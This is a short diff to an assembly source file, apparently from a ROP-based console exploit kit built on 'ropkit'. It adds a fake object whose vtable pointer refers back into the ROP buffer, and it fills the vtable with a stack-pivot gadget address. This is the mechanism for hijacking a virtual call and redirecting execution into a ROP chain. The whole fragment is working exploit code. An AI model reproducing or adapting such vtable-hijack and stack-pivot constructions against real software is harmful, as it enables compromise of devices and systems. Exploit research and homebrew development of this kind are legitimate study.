@@ -72,5 +72,9 @@ stackpivot_pcloadword:
 ropstackstart:
 #include "ropkit_boototherapp.s"
 
+ropkit_cmpobject:
+.word (ROPBUF + (ropkit_cmpobject - _start) + 0x4) @ Vtable-ptr
+.fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable
+
 .space ((_start + 0x26b0) - .)
 
